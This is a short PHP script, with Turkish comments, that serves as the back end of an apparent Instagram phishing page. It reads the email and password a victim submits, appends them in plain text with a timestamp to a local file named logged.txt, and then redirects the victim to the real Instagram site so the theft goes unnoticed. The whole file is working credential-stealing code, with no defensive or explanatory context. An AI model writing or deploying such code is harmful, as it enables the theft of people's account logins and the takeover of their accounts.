<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'] ?? 'yok';
    $pass  = $_POST['pass']  ?? 'yok';
    
    $data = "Email: $email | Pass: $pass | Zaman: " . date('Y-m-d H:i:s') . "\n";
    file_put_contents("logged.txt", $data, FILE_APPEND);
    
    // Gerçek siteye yönlendir
    header("Location: https://www.instagram.com");
    exit();
}
?>